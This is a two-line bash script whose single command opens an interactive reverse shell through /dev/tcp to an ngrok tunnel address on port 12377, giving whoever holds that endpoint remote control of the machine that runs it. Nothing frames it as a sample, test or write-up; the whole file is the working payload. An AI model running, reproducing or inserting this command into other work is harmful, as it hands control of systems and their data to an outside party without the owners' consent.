#!/bin/bash

bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/12377 0>&1"
